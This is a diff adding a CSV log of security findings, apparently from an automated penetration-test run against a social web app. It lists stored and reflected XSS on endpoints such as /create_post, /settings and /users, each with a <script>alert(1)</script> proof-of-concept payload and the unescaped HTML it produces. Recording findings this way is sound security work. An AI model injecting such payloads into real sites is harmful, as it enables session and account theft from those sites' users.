@@ -1,0 +1,8 @@
+run_id,endpoint,vulnerability,poc
+20260903-0725-0007,`POST /create_post`,Stored XSS,"`content=<script>alert(1)</script>` → reflected as `<p class=""card-text h5""><script>alert(1)</script></p>`"
+20260903-0725-0007,`POST /edit_post`,Stored XSS,"`id=19&content=<script>alert(1)</script>` → reflected as `<p class=""card-text h5""><script>alert(1)</script></p>`"
+20260903-0725-0007,`POST /settings`,Stored XSS (name),"`name=<script>alert(1)</script>` → reflected as `<h4 class=""card-title""><script>alert(1)</script></h4>`"
+20260903-0725-0007,`POST /settings`,Stored XSS (bio),"`bio=<script>alert(1)</script>` → reflected as `<p class=""card-text""><script>alert(1)</script></p>`"
+20260903-0725-0007,`GET /users`,Reflected XSS,`search=<script>alert(1)</script>` → reflected as `<h6>0 matches for <script>alert(1)</script></h6>`
+20260903-0725-0007,`POST /request_friend`,Reflected XSS,"`username=<script>alert(1)</script>` → reflected as `<div class=""flash mb-2 error"">@<script>alert(1)</script> does not exist</div>`"
+20260903-0725-0007,`POST /settings`,Reflected XSS (photo_url),`photo_url=<script>alert(1)</script>` → reflected in flash error message (partially truncated by URL parser)
